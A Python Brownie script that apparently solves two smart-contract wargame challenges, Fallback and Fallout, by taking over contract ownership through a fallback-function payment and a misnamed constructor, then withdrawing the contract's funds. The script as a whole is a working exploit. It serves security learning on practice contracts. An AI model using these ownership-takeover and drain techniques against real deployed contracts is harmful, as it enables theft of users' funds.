from brownie import Fallback, Fallout, network, config, accounts, Contract
from scripts.helpful_scripts import *
from web3 import Web3


def deploy_fallback():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if deploying locally, we want to use another account so we can try to escalate privs
        fallBack = Fallback.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fallBackAddr = config["networks"][network.show_active()]["fallBack_address"]
        fallBack = Contract.from_abi("Fallback", fallBackAddr, Fallback.abi)

    print(f"Fallback deployed to {fallBack.address}")
    # now we attack
    attackFallback(fallBack, account)

def attackFallback(_fallBack, _account):

    contributions = _fallBack.getContribution({"from": _account})
    print(f"Before the attack...Current contributions: {contributions} Are we the owner?: {_fallBack.owner() == _account}")

    # adding .wait(1) shouldn't be necessary, but we're explicitly waiting for the block to be mined
    _fallBack.contribute({"value": 500000000000000, "from": _account}).wait(1)
    contributions = _fallBack.getContribution({"from": _account})
    print(f"Contributions now: {contributions}")
    _account.transfer(_fallBack.address,"0.01 ether").wait(1)
    owner = _fallBack.owner()
    areWeOwner = (owner == _account)
    print(f"Sent .01 ETH. Are we the owner?: {areWeOwner}")
    _fallBack.withdraw({"from":_account})
    print("Fallback attacked! Try submitting the solution as complete.")


def deploy_fallout():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if deploying locally, we want to use another account so we can try to escalate privs
        fallOut = Fallout.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fallOutAddress = config["networks"][network.show_active()]["fallOut_address"]
        fallOut = Contract.from_abi("Fallout", fallOutAddress, Fallout.abi)

    print(f"Fallout deployed to {fallOut.address}")
    # now we attack
    attackFallout(fallOut, account)

def attackFallout(_fallOut, _account):
    print(f"Before the attack...are we the owner? {_account == _fallOut.owner()}")
    _fallOut.Fal1out({"from":_account, "value":0})
    print(f"After the attack...are we the owner? {_account == _fallOut.owner()}")
    print("Fallout attacked! Try submitting the solution as complete.")





def main():
    #deploy_fallback()
    deploy_fallout()
